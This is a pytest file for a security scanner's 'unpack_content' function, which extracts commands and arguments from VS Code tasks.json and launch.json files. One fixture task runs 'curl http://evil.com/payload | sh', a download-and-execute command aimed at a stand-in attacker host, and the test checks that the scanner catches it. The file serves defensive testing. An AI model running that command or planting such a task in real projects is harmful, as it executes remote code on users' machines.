import json
import pytest
from gptscan import unpack_content

def test_unpack_tasks_json():
    content = {
        "version": "2.0.0",
        "tasks": [
            {
                "label": "Build project",
                "type": "shell",
                "command": "npm run build",
                "args": ["--verbose"]
            },
            {
                "label": "Suspicious task",
                "command": "curl http://evil.com/payload | sh",
                "args": "--silent"
            }
        ]
    }
    content_bytes = json.dumps(content).encode('utf-8')
    snippets = list(unpack_content("tasks.json", content_bytes))

    # Expected snippets:
    # 1. npm run build
    # 2. --verbose
    # 3. curl http://evil.com/payload | sh
    # 4. --silent

    assert len(snippets) == 4
    assert snippets[0][0] == "tasks.json [Task: Build project]"
    assert snippets[0][1] == b"npm run build"
    assert snippets[1][0] == "tasks.json [Task Args: Build project]"
    assert snippets[1][1] == b"--verbose"
    assert snippets[2][0] == "tasks.json [Task: Suspicious task]"
    assert snippets[2][1] == b"curl http://evil.com/payload | sh"
    assert snippets[3][0] == "tasks.json [Task Args: Suspicious task]"
    assert snippets[3][1] == b"--silent"

def test_unpack_tasks_json_with_comments():
    content_str = """
    {
        "version": "2.0.0",
        // This is a comment
        "tasks": [
            {
                "label": "Test",
                /* Multi-line
                   comment */
                "command": "pytest"
            }
        ]
    }
    """
    content_bytes = content_str.encode('utf-8')
    snippets = list(unpack_content("tasks.json", content_bytes))

    assert len(snippets) == 1
    assert snippets[0][0] == "tasks.json [Task: Test]"
    assert snippets[0][1] == b"pytest"

def test_unpack_launch_json():
    content = {
        "version": "0.2.0",
        "configurations": [
            {
                "name": "Python: Current File",
                "type": "python",
                "request": "launch",
                "program": "${file}",
                "args": ["--debug"],
                "preLaunchTask": "build-task"
            }
        ]
    }
    content_bytes = json.dumps(content).encode('utf-8')
    snippets = list(unpack_content("launch.json", content_bytes))

    # Expected snippets:
    # 1. ${file}
    # 2. --debug
    # 3. build-task

    assert len(snippets) == 3
    assert snippets[0][0] == "launch.json [Launch: Python: Current File]"
    assert snippets[0][1] == b"${file}"
    assert snippets[1][0] == "launch.json [Launch Args: Python: Current File]"
    assert snippets[1][1] == b"--debug"
    assert snippets[2][0] == "launch.json [PreLaunch: Python: Current File]"
    assert snippets[2][1] == b"build-task"
